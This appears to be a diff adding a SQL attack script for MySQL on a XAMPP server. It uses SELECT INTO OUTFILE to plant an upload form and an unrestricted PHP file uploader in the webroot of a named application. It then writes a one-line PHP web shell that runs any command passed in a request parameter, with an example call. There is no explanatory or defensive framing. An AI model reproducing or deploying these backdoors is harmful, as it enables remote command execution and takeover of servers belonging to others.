@@ -1,0 +1,23 @@
+use mysql;
+DROP TABLE IF EXISTS `temptab`;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<form enctype="multipart/form-data" action="upload.php" method="post"><pre lang="html">Upload file :<form enctype="multipart/form-data" action="upload2.php" method="post"><input name="userfile" type="file" /><input type="submit" value="Upload" /></form>');
+SELECT * INTO OUTFILE 'D:/xampp/htdocs/sipencatar/app/webroot/upload/upload2.php' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
+
+use mysql;
+DROP TABLE IF EXISTS `temptab`;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<?php $uploaddir = "D:/xampp/htdocs/sipencatar/app/webroot/upload/";$uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]);echo "
+<pre>";if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile))print "";?>');
+SELECT * INTO OUTFILE 'D:/xampp/htdocs/sipencatar/app/webroot/upload/upload.php' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
+
+
+
+SELECT@@datadir
+
+
+     SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "full/path/here/cmd.php"    cmds.php?cmd=dir
